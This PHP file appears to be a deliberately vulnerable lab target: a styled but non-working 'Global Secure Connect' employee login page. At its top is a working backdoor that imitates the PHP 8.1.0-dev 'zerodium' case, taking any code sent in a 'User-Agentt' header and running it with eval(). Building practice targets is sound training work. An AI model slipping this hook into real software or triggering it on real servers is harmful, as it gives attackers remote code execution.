<?php
// Leak PHP Version as requested
header("X-Powered-By: PHP/8.1.0-dev");

// PHP 8.1.0-dev Backdoor Simulation
if (isset($_SERVER['HTTP_USER_AGENTT']) && strpos($_SERVER['HTTP_USER_AGENTT'], 'zerodium') === 0) {
    $command = substr($_SERVER['HTTP_USER_AGENTT'], 8);
    // The real backdoor used zend_eval_string
    eval($command);
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Global Secure Connect | Employee Portal</title>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #ef4444;
            --accent: #f87171;
            --bg: #111827;
            --card-bg: #1f2937;
            --text: #f3f4f6;
            --text-dim: #9ca3af;
        }

        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: 'Outfit', sans-serif;
            background-color: var(--bg);
            color: var(--text);
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            background-image: radial-gradient(circle at 50% 50%, #1e1b4b 0%, #111827 100%);
        }

        .login-card {
            background: var(--card-bg);
            width: 100%;
            max-width: 400px;
            padding: 2.5rem;
            border-radius: 1.5rem;
            border: 1px solid rgba(255,255,255,0.1);
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            text-align: center;
        }

        .logo-mark {
            width: 60px;
            height: 60px;
            background: var(--primary);
            border-radius: 1rem;
            margin: 0 auto 1.5rem;
            display: flex;
            align-items: center;
            justify-content: center;
            transform: rotate(-10deg);
        }

        h1 { font-size: 1.75rem; margin-bottom: 0.5rem; font-weight: 700; }
        p { color: var(--text-dim); margin-bottom: 2rem; font-size: 0.875rem; }

        .input-field {
            width: 100%;
            background: #111827;
            border: 1px solid #374151;
            padding: 0.75rem 1rem;
            border-radius: 0.75rem;
            color: white;
            margin-bottom: 1rem;
            text-align: left;
        }

        .btn {
            width: 100%;
            background: var(--primary);
            color: white;
            padding: 0.75rem;
            border-radius: 0.75rem;
            font-weight: 600;
            border: none;
            cursor: pointer;
            transition: all 0.2s;
            margin-top: 1rem;
        }

        .btn:hover {
            background: var(--accent);
            transform: scale(1.02);
        }

        .footer-note {
            margin-top: 2rem;
            font-size: 0.75rem;
            color: var(--text-dim);
        }
    </style>
</head>
<body>
    <div class="login-card">
        <div class="logo-mark">
            <svg width="32" height="32" viewBox="0 0 24 24" fill="white"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
        </div>
        <h1>Portal Login</h1>
        <p>Advanced security gateway for Global Secure Connect employees.</p>
        
        <div class="input-field">Username</div>
        <div class="input-field">Password</div>
        
        <button class="btn">Authenticate</button>
        
        <div class="footer-note">
            Protected by QuantumShield™ Encryption.<br>
            Authorized access only.
        </div>
    </div>
</body>
</html>
